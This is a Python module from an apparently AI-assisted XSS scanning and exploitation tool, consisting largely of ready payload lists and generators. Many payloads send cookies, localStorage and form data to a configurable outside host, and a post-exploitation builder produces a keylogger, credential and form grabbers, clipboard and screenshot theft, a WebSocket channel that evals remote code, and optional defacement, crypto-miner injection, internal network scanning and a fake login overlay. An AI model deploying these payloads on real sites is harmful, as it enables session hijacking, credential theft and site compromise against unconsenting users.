import base64
import random
import re
import urllib.parse
from typing import List, Dict, Optional, Tuple, Any

from . import config
from .ai_integration import AIEnhancedPayloadEngine, GroqClient


BASE_PAYLOADS_REFLECTED = [
    # Basic script
    "<script>alert(1)</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<script>document.domain</script>",
    "<script>var a=1;</script>",
    # img onerror
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=confirm('xss')>",
    "<img src=x onerror=prompt(1)>",
    "<img src=@ onerror=alert(1)>",
    # svg onload
    "<svg onload=alert(1)>",
    "<svg onload=confirm(1)>",
    "<svg/onload=alert(1)>",
    # iframe
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<iframe onload=alert(1)>",
    # body
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    # Event handlers
    "<img src=x onmouseover=alert(1)>",
    "<img src=x onfocus=alert(1) autofocus>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<div onmouseover=alert(1)>X</div>",
    # Polyglot / context breakers
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "--> <script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    # javascript protocol
    "<a href=javascript:alert(1)>x</a>",
    "<form action=javascript:alert(1)><input type=submit></form>",
    # meta
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<meta http-equiv=refresh content='0;javascript:alert(1)'>",
    # deprecated but useful
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    # CSS expression
    "<div style=background:url(javascript:alert(1))>x</div>",
    "<style>body{background:url('javascript:alert(1)')}</style>",
    # Link and object
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # encoding obfuscation
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
    "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",
    # tab/newline
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(1)>",
    # null byte
    "<img src=x onerror=alert(1)>",
    # base tag
    "<base href=javascript:alert(1)>",
    # complex eval
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>eval(atob('Y29uZmlybSgxKQ=='))</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    # data URI
    "<script src=data:text/javascript,alert(1)>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    # Angular sandbox escape (legacy)
    "{{constructor.constructor('alert(1)')()}}",
    "#<img src=/ onerror=alert(1)>",
    # Non-standard but effective
    "<isindex action=javascript:alert(1) type=image>",
    "<input onfocus=alert(1) autofocus>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    # MathML
    "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
    # SVG with animate
    "<svg><animate onbegin=alert(1)>",
    "<svg><animatetransform onbegin=alert(1)>",
    # setInterval
    "<img src=x id=_ onerror='setInterval(()=>alert(1),1)'>",
    # import
    "<script>import('http://localhost/x')['catch'](alert)</script>",
]

BASE_PAYLOADS_BLIND = [
    # Image callback
    '<script>new Image().src="http://{collab}/xss?c="+document.cookie</script>',
    '<img src=x onerror="new Image().src=\'http://{collab}/xss?c=\'+document.cookie">',
    '<svg onload="new Image().src=\'http://{collab}/xss?c=\'+document.cookie">',
    '<body onload="new Image().src=\'http://{collab}/xss?c=\'+document.cookie">',
    # fetch callback
    '<script>fetch("http://{collab}/xss?c="+btoa(document.cookie))</script>',
    '<script>navigator.sendBeacon("http://{collab}/log", document.cookie)</script>',
    # script src callback
    '<script src="http://{collab}/hook.js"></script>',
    '<img src="http://{collab}/track.gif">',
    # Multiple exfil
    '<script>var x=new XMLHttpRequest();x.open("GET","http://{collab}/xss?c="+encodeURIComponent(document.cookie));x.send();</script>',
    '<script>(function(){var i=new Image();i.src="http://{collab}/xss?c="+btoa(JSON.stringify({c:document.cookie,u:location.href,d:document.domain}));})();</script>',
    # iframe callback
    '<iframe src="http://{collab}/xss?c="+document.cookie>',
    '<iframe srcdoc="<script>new Image().src=\'http://{collab}/xss?c=\'+document.cookie</script>">',
    # localStorage exfil
    '<script>var d={c:document.cookie,l:JSON.stringify(localStorage),s:JSON.stringify(sessionStorage)};fetch("http://{collab}/exfil",{method:"POST",body:JSON.stringify(d)})</script>',
    # WebSocket callback
    '<script>new WebSocket("ws://{collab}/ws?c="+document.cookie)</script>',
    # DNS-style callback via image
    '<script>document.body.innerHTML+="<img src=http://{collab}/dns/"+document.cookie+".gif>"</script>',
    # EventSource
    '<script>new EventSource("http://{collab}/events?c="+document.cookie)</script>',
    # window.name exfil
    '<script>window.name=document.cookie;location="http://{collab}/name?n="+window.name</script>',
]

PAYLOADS_DOM = [
    "#<img src=x onerror=alert(1)>",
    "#<svg onload=alert(1)>",
    "javascript:alert(1)",
    "';alert(1);//",
    "\\';alert(1);//",
    "*/alert(1)/*",
    "-alert(1)-",
    "',alert(1),'",
    "`;alert(1);//",
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "#/''/\"",
    "onerror=alert(1)",
    "';new Image().src='http://{collab}/xss?c='+document.cookie;//",
    "#/\" onload=alert(1) x=\"",
]


class PayloadEngine:
    def __init__(self, collab_url: Optional[str] = None):
        self.collab_url = collab_url

    def generate_reflected(self, max_payloads=0) -> List[str]:
        payloads = list(BASE_PAYLOADS_REFLECTED)
        variants = self._generate_variants(payloads)
        all_p = payloads + variants
        if max_payloads > 0:
            random.shuffle(all_p)
            return all_p[:max_payloads]
        return all_p

    def generate_blind(self, max_payloads=0) -> List[str]:
        payloads = []
        for p in BASE_PAYLOADS_BLIND:
            payloads.append(self._resolve_collab(p))
        if self.collab_url:
            exfil_src = '<script>new Image().src="http://{collab}/xss?c="+document.cookie</script>'
            encoded = base64.b64encode(exfil_src.replace("{collab}", self._collab_hostport()).encode()).decode()
            payloads.append(f'<script>eval(atob("{encoded}"))</script>')
        # Add encoded variants of blind payloads
        blind_variants = []
        for p in payloads[:20]:
            for enc in self._encode_variants(p):
                blind_variants.append(enc)
        all_p = payloads + blind_variants
        if max_payloads > 0:
            random.shuffle(all_p)
            return all_p[:max_payloads]
        return all_p

    def generate_dom(self, max_payloads=0) -> List[str]:
        payloads = []
        for p in PAYLOADS_DOM:
            payloads.append(self._resolve_collab(p))
        if max_payloads > 0:
            random.shuffle(payloads)
            return payloads[:max_payloads]
        return payloads

    def generate_post_exploit(self, payload: str, exfil_url: str, xss_type: str = "reflected") -> Dict:
        return generate_post_exploit_payload(payload, exfil_url, xss_type)

    def _collab_hostport(self) -> str:
        url = self.collab_url or ""
        return re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", url).rstrip("/")

    def _resolve_collab(self, p: str) -> str:
        if "{collab}" not in p or not self.collab_url:
            return p
        return p.replace("{collab}", self._collab_hostport())

    def _generate_variants(self, base_payloads: List[str]) -> List[str]:
        variants = []
        for p in base_payloads[:80]:
            if len(p) < 8:
                continue
            for enc in self._encode_variants(p):
                variants.append(enc)
        return variants

    def _encode_variants(self, payload: str) -> List[str]:
        result = []
        # Case variation
        result.append(self._case_swap(payload))
        # Double URL encode
        result.append(urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe=''))
        # HTML entities
        result.append(self._html_entity_encode(payload))
        # Unicode escapes in JS
        if "alert" in payload and "eval" not in payload:
            result.append(payload.replace("alert", "\\u0061\\u006c\\u0065\\u0072\\u0074"))
            result.append(payload.replace("alert", "\\x61\\x6c\\x65\\x72\\x74"))
        # Mixed encoding
        result.append(self._mixed_encoding(payload))
        # Comment injection
        if "<script>" in payload:
            result.append(payload.replace("<script>", "<scr<!-- -->ipt>"))
            result.append(payload.replace("<script>", "<s\\x63ript>"))
        # Tab injection
        result.append(re.sub(r'\bonerror=', r'\tonerror=', payload))
        result.append(re.sub(r'\bonload=', r'\tonload=', payload))
        # Null byte
        result.append(payload.replace("onerror", "onerror%00"))
        # Newline variations
        if "onerror" in payload:
            result.append(payload.replace(" onerror=", " \nonerror="))
        # Double tag
        if "<" in payload:
            result.append(payload.replace("<", "<<").replace(">", ">>"))
        return [r for r in result if r != payload][:8]

    def _case_swap(self, p: str) -> str:
        pattern = {"script": "ScRiPt", "img": "ImG", "svg": "SvG", "onerror": "OnErRoR", "onload": "OnLoAd", "alert": "AlErT"}
        for k, v in pattern.items():
            p = p.replace(k, v)
        return p

    def _html_entity_encode(self, p: str) -> str:
        if '"' in p or "'" in p:
            entities = {'<': '&#60;', '>': '&#62;', '"': '&#34;', "'": '&#39;'}
        else:
            entities = {'<': '&#60;', '>': '&#62;'}
        for k, v in entities.items():
            p = p.replace(k, v)
        return p

    def _mixed_encoding(self, p: str) -> str:
        if "alert(" in p:
            p = p.replace("alert(", "&#97;&#108;&#101;&#114;&#116;(")
        return p

    def generate_ai_enhanced(self, context: str, framework: str, waf_info: Dict, 
                             target_url: str, param: str, groq_client: Optional[GroqClient] = None) -> List[str]:
        if groq_client:
            ai_engine = AIEnhancedPayloadEngine(groq_client=groq_client, collab_url=self.collab_url)
            return ai_engine.generate_smart_payloads(context, framework, waf_info, target_url, param)
        return self.generate_reflected(max_payloads=50)

    def generate_modern_framework_payloads(self, framework: str, collab_url: str = None) -> List[str]:
        payloads = []
        fw_lower = framework.lower()
        
        if "react" in fw_lower:
            payloads.extend([
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "{% raw %}{{constructor.constructor('alert(1)')()}}{% endraw %}",
                "<iframe srcdoc='<script>alert(1)</script>'>",
                "<details open ontoggle=alert(1)>",
            ])
        elif "vue" in fw_lower:
            payloads.extend([
                "{{constructor.constructor('alert(1)')()}}",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<img :src='x' onerror=alert(1)>",
                "{{7*7}}",
                "<div v-html=\"'<script>alert(1)</script>'\"></div>",
            ])
        elif "angular" in fw_lower:
            payloads.extend([
                "{{constructor.constructor('alert(1)')()}}",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "{{$eval.constructor('alert(1)')()}}",
                "{{$new.constructor('alert(1)')()}}",
            ])
        elif "svelte" in fw_lower:
            payloads.extend([
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "{@html '<script>alert(1)</script>'}",
                "<svelte:component this='<script>alert(1)</script>' />",
            ])
        elif "next" in fw_lower or "nuxt" in fw_lower:
            payloads.extend([
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<script>alert(1)</script>",
                "<NextScript><script>alert(1)</script></NextScript>",
            ])
        
        collab = collab_url or self.collab_url
        if collab:
            hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
            blind_payloads = [
                f"<script>fetch('http://{hostport}/exfil',{{method:'POST',body:JSON.stringify({{cookie:document.cookie,storage:JSON.stringify(localStorage)}})}})</script>",
                f"<script>navigator.sendBeacon('http://{hostport}/exfil',document.cookie)</script>",
                f"<img src=x onerror=\"fetch('http://{hostport}/steal?c='+document.cookie)\">",
            ]
            payloads.extend(blind_payloads)
        
        return list(set(payloads))

    def generate_mutation_xss_payloads(self, collab_url: str = None) -> List[str]:
        payloads = [
            "<svg><animate attributeName=x onbegin=alert(1)>",
            "<svg><set attributeName=x onbegin=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<body onfocus=alert(1) autofocus>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<math><maction actiontype='statusline#' onmouseover=alert(1)>X</maction></math>",
            "<svg><foreignObject onload=alert(1)>",
            "<svg><use onload=alert(1) href='#x'></use></svg>",
        ]
        
        collab = collab_url or self.collab_url
        if collab:
            hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
            payloads.extend([
                f"<details open ontoggle=\"fetch('http://{hostport}/mut')\">",
                f"<marquee onstart=\"new Image().src='http://{hostport}/mut'\">",
                f"<video><source onerror=\"fetch('http://{hostport}/mut')\">",
            ])
        
        return payloads

    def generate_prototype_pollution_payloads(self, collab_url: str = None) -> List[str]:
        payloads = [
            "__proto__[xss]=alert(1)",
            "constructor[prototype][xss]=alert(1)",
            "constructor.prototype.xss=alert(1)",
            "__proto__.polluted=1",
            "Object.prototype.xss=alert(1)",
            "Array.prototype.xss=alert(1)",
        ]
        
        collab = collab_url or self.collab_url
        if collab:
            hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
            payloads.extend([
                f"__proto__[srcdoc]='<script>fetch(\"http://{hostport}/proto\")</script>'",
                f"constructor.prototype.innerHTML='<img src=x onerror=fetch(\"http://{hostport}/proto\")>'",
            ])
        
        return payloads

    def generate_web_socket_payloads(self, collab_url: str = None) -> List[str]:
        collab = collab_url or self.collab_url
        if not collab:
            return []
        
        hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
        ws_host = hostport.replace("http://", "ws://").replace("https://", "wss://")
        
        return [
            f"<script>new WebSocket('ws://{ws_host}/ws?c='+document.cookie)</script>",
            f"<script>var ws=new WebSocket('ws://{ws_host}/ws');ws.onopen=function(){{ws.send(JSON.stringify({{cookie:document.cookie,url:location.href,storage:JSON.stringify(localStorage)}}))}}</script>",
            f"<script>var ws=new WebSocket('ws://{ws_host}/c2');ws.onmessage=function(e){{eval(e.data)}};</script>",
        ]

    def generate_service_worker_payloads(self, collab_url: str = None) -> List[str]:
        collab = collab_url or self.collab_url
        if not collab:
            return []
        
        hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
        
        return [
            f"""<script>
navigator.serviceWorker.register('http://{hostport}/sw.js').then(function(reg) {{
    reg.pushManager.subscribe({{userVisibleOnly:true}}).then(function(sub) {{
        fetch('http://{hostport}/sw_reg',{{method:'POST',body:JSON.stringify(sub)}});
    }});
}});
</script>""",
            f"""<script>
if('serviceWorker' in navigator) {{
    navigator.serviceWorker.register('data:application/javascript,'
        +encodeURIComponent('self.addEventListener("fetch",e=>{{e.respondWith(new Response("XSS",{{headers:{{"Content-Type":"text/html"}}}}))}}'));
}}
</script>""",
        ]

    def generate_web_worker_payloads(self, collab_url: str = None) -> List[str]:
        collab = collab_url or self.collab_url
        if not collab:
            return []
        
        hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
        
        return [
            f"""<script>
var w=new Worker('data:application/javascript,'
    +encodeURIComponent('self.onmessage=function(e){{fetch("http://{hostport}/worker?d="+btoa(JSON.stringify(e.data)))}}'));
w.postMessage({{cookie:document.cookie,storage:JSON.stringify(localStorage),url:location.href}});
</script>""",
        ]

    def generate_indexeddb_payloads(self, collab_url: str = None) -> List[str]:
        collab = collab_url or self.collab_url
        if not collab:
            return []
        
        hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
        
        return [
            f"""<script>
var req=indexedDB.open('xss_db',1);
req.onupgradeneeded=function(e){{var db=e.target.result;db.createObjectStore('loot')}};
req.onsuccess=function(e){{var db=e.target.result;
    var tx=db.transaction('loot','readwrite');
    tx.objectStore('loot').put({{cookie:document.cookie,url:location.href,storage:JSON.stringify(localStorage)}},'xss');
    fetch('http://{hostport}/idb',{{method:'POST',body:'stored'}});
}};
</script>""",
        ]

    def generate_postmessage_payloads(self, collab_url: str = None) -> List[str]:
        collab = collab_url or self.collab_url
        if not collab:
            return []
        
        hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/")
        
        return [
            f"""<script>
window.addEventListener('message',function(e){{
    fetch('http://{hostport}/postmsg',{{method:'POST',body:JSON.stringify({{origin:e.origin,data:e.data}})}});
    e.source.postMessage({{xss:true,cookie:document.cookie}},e.origin);
}});
</script>""",
            f"""<script>
parent.postMessage({{xss:'exploit',cookie:document.cookie}},'*');
fetch('http://{hostport}/postmsg_parent',{{method:'POST',body:document.cookie}});
</script>""",
        ]

    def generate_csp_bypass_payloads(self, csp: Dict, collab_url: str = None) -> List[str]:
        payloads = []
        collab = collab_url or self.collab_url
        hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab).rstrip("/") if collab else ""
        
        script_src = csp.get("script-src", csp.get("default-src", []))
        script_src_str = " ".join(script_src)
        
        if "'unsafe-inline'" in script_src_str:
            payloads.append("<script>alert(1)</script>")
            payloads.append("<img src=x onerror=alert(1)>")
        
        if "'unsafe-eval'" in script_src_str:
            payloads.append("<script>eval('alert(1)')</script>")
            payloads.append("<script>new Function('alert(1)')()</script>")
            payloads.append("<script>setTimeout('alert(1)')</script>")
        
        if any(d in script_src_str for d in ["cdn.jsdelivr.net", "cdnjs.cloudflare.com", "unpkg.com", "ajax.googleapis.com"]):
            payloads.append(f"<script src='https://cdn.jsdelivr.net/npm/alert@1'></script>")
            payloads.append(f"<script src='https://cdnjs.cloudflare.com/ajax/libs/alert/1.0/alert.min.js'></script>")
        
        if "data:" in script_src_str:
            payloads.append("<script src='data:text/javascript,alert(1)'></script>")
            payloads.append("<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">")
        
        if "blob:" in script_src_str:
            payloads.append("<script src='blob:https://example.com/...'></script>")
        
        if "'self'" in script_src_str and hostport:
            payloads.append(f"<script src='http://{hostport}/fake.js'></script>")
        
        if "nonce-" in script_src_str:
            payloads.append("<script nonce='bypass'>alert(1)</script>")
        
        return payloads


def generate_post_exploit_payload(base_payload: str, exfil_url: str, xss_type: str = "reflected", aggressive: bool = False) -> Dict:
    """Build exploitation payloads.

    Core (exfiltration + capture) techniques are always returned; destructive and
    persistent techniques (defacement, crypto miner, port scan, phishing, storage
    poisoning, clickjacking) are only included when aggressive=True.
    """
    results = {}
    collab = (exfil_url or "").rstrip("/")
    # Cookie theft
    results["cookie_theft"] = f"<script>new Image().src='{collab}/steal?c='+document.cookie</script>"
    results["cookie_theft_fetch"] = f"<script>fetch('{collab}/steal',{{method:'POST',body:document.cookie}})</script>"
    results["cookie_theft_beacon"] = f"<script>navigator.sendBeacon('{collab}/steal',document.cookie)</script>"
    # Keylogger
    results["keylogger"] = f"""<script>
document.addEventListener('keydown',function(e){{var k=String.fromCharCode(e.which||e.keyCode);new Image().src='{collab}/key?k='+encodeURIComponent(k)+'&t='+Date.now()}})
</script>"""
    # Content theft
    results["content_theft"] = f"<script>new Image().src='{collab}/content?h='+btoa(document.documentElement.innerHTML.substring(0,2000))</script>"
    results["localstorage_theft"] = f"<script>new Image().src='{collab}/storage?l='+btoa(JSON.stringify(localStorage))+'&s='+btoa(JSON.stringify(sessionStorage))</script>"
    # CSRF token theft
    results["csrf_token_theft"] = f"""<script>
var m=document.querySelector('[name=csrf_token],[name=_token],[name=csrfmiddlewaretoken]');
if(m)fetch('{collab}/csrf?t='+encodeURIComponent(m.value));
</script>"""
    # Form grabber (auto-submit capture)
    results["form_grabber"] = f"""<script>
document.addEventListener('submit',function(e){{var d=new FormData(e.target);var p=[];for(var [k,v] of d){{p.push(k+'='+encodeURIComponent(v))}};new Image().src='{collab}/formgrab?'+p.join('&')}});
</script>"""
    # Auto credential grabber (watches for login forms, incl. dynamically added)
    results["auto_login_grab"] = f"""<script>
(function(){{var c='{collab}';
var o=new MutationObserver(function(){{var f=document.querySelector('form');if(f&&!f.dataset.xhook){{f.dataset.xhook=1;f.addEventListener('submit',function(){{var d=new FormData(f);var out=[];for(var x of d){{if(/pass|user|email|login|token/i.test(x[0]))out.push(x[0]+'='+x[1])}};if(out.length)new Image().src=c+'/cred?d='+btoa(out.join('&'))}})}}}});o.observe(document.body,{{childList:true,subtree:true}})}})();
</script>"""
    # Clipboard theft
    results["clipboard_theft"] = f"""<script>
document.addEventListener('copy',function(e){{var c=window.getSelection().toString();fetch('{collab}/clipboard',{{method:'POST',body:c}})}});
</script>"""
    # postMessage hijack
    results["postmessage_hook"] = f"""<script>
window.addEventListener('message',function(e){{new Image().src='{collab}/postmsg?o='+encodeURIComponent(e.origin)+'&d='+btoa(JSON.stringify({{data:e.data}}))}});
</script>"""
    # User activity / telemetry tracker
    results["activity_tracker"] = f"""<script>
document.addEventListener('click',function(e){{var t=(e.target&&e.target.outerHTML)?e.target.outerHTML.slice(0,200):'';new Image().src='{collab}/click?x='+e.clientX+'&y='+e.clientY+'&t='+btoa(t)}});
window.addEventListener('focus',function(){{new Image().src='{collab}/focus'}});
</script>"""
    # Session / token fixation
    results["token_fixation"] = """<script>
document.cookie='PHPSESSID=0xdeadbeef;path=/';
document.cookie='session=0xdeadbeef;path=/';
document.cookie='auth_token=0xdeadbeef;path=/';
</script>"""
    # Screenshot via canvas
    results["screenshot"] = f"""<script>
var c=document.createElement('canvas');c.width=window.innerWidth;c.height=window.innerHeight;
c.getContext('2d').drawWindow(window,0,0,c.width,c.height);
c.toBlob(function(b){{var f=new FormData();f.append('screen',b);fetch('{collab}/screenshot',{{method:'POST',body:f}})}});
</script>"""
    # Combined full-chain capture (one payload does everything)
    results["full_chain"] = f"""<script>
(function(){{var c=document.cookie;var l=JSON.stringify(localStorage);var s=JSON.stringify(sessionStorage);
var b='{collab}';
function p(k,v){{new Image().src=b+'/'+k+'?v='+encodeURIComponent(v)}}
p('chain',btoa(JSON.stringify({{c:c,l:l,s:s,ua:navigator.userAgent,sc:screen.width+'x'+screen.height,url:location.href}})));
document.addEventListener('keydown',function(e){{p('chainkey',e.key)}});
document.addEventListener('submit',function(e){{var f=new FormData(e.target);var a=[];for(var x of f)a.push(x[0]+'='+x[1]);p('chainform',btoa(a.join('&')))}});
document.addEventListener('copy',function(){{p('chainclip',btoa(window.getSelection().toString()))}});
}})();
</script>"""

    # --- Aggressive: destructive / persistent techniques ---
    if aggressive:
        # Defacement
        results["defacement"] = f"<script>document.body.innerHTML='<h1>HACKED</h1><p>This site has been compromised.</p>';new Image().src='{collab}/deface'</script>"
        # Crypto miner injection
        results["crypto_miner"] = f'<script src="{collab}/miner.js"></script>'
        # Port scan (probes localhost from the victim's browser)
        results["port_scan"] = f"""<script>
var ports=[22,80,443,8080,8443,3306,5432,6379,27017];
ports.forEach(function(p){{var img=new Image();img.onload=function(){{new Image().src='{collab}/port?p='+p+'&o=open'}};img.onerror=function(){{new Image().src='{collab}/port?p='+p+'&o=closed'}};img.src='http://localhost:'+p}});
</script>"""
        # Internal network scanning
        results["internal_scan"] = f"""<script>
var ips=['10.0.0.1','192.168.1.1','172.16.0.1'];
ips.forEach(function(ip){{fetch('http://'+ip+':80',{{mode:'no-cors'}}).then(function(r){{new Image().src='{collab}/scan?ip='+ip+'&s='+r.status}})}});
</script>"""
        # History sniffing
        results["history_sniff"] = f"""<script>
var urls=['/admin','/dashboard','/login','/profile','/settings','/api','/config'];
urls.forEach(function(u){{var a=document.createElement('a');a.href=u;a.style.cssText='display:none';var c=a.style.color;var t=setInterval(function(){{if(a.style.color!=c){{new Image().src='{collab}/history?u='+encodeURIComponent(u)}}}},100);document.body.appendChild(a)}});
</script>"""
        # Phishing overlay (fake "session expired" login capture)
        results["phishing_overlay"] = f"""<script>
var d=document.createElement('div');d.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);z-index:9999;display:flex;align-items:center;justify-content:center"><div style="background:#fff;padding:30px;border-radius:10px;text-align:center"><h2>Session Expired</h2><p>Please login again</p><form action="{collab}/phish" method=POST><input name=user placeholder=Username><br><input name=pass type=password placeholder=Password><br><input type=submit value=Login></form></div></div>';document.body.appendChild(d);
</script>"""
        # Storage poisoning (persist attacker-controlled value for future visits)
        results["storage_poisoning"] = f"""<script>
(function(){{var p='{collab}/persist';try{{localStorage.setItem('__xsstored__',p);sessionStorage.setItem('__xsstored__',p);new Image().src=p+'?k=poisoned'}}catch(e){{}}}})();
</script>"""
        # Clickjacking iframe overlay
        results["iframe_overlay"] = f"""<script>
var f=document.createElement('iframe');f.src='{collab}/phish';f.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;opacity:.6;z-index:99999;border:0';document.body.appendChild(f);
</script>"""
    return results


def context_specific_payloads(context: str, collab_url: str = None) -> List[str]:
    payloads = []
    if context == "html":
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
        ]
    elif context == "attribute":
        payloads = [
            '" autofocus onfocus=alert(1) x="',
            "' autofocus onfocus=alert(1) x='",
            '" onmouseover=alert(1) x="',
            "' onmouseover=alert(1) x='",
            '" onfocus=alert(1) autofocus x="',
            "' onfocus=alert(1) autofocus x='",
            '" onclick=alert(1) x="',
        ]
    elif context == "javascript":
        payloads = [
            "';alert(1);//",
            "';alert(1);'",
            "\\';alert(1);//",
            "*/alert(1)/*",
            "-alert(1)-",
            "',alert(1),'",
            "`;alert(1);//",
            "${alert(1)}",
            "';new Image().src='http://{collab}/xss?c='+document.cookie;//",
        ]
    elif context == "url":
        payloads = [
            "javascript:alert(1)",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
        ]
    elif context == "css":
        payloads = [
            "javascript:alert(1)",
            "url(javascript:alert(1))",
            "expression(alert(1))",
        ]
    if collab_url:
        hostport = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", collab_url).rstrip("/")
        payloads = [p.replace("{collab}", hostport) for p in payloads]
    return payloads
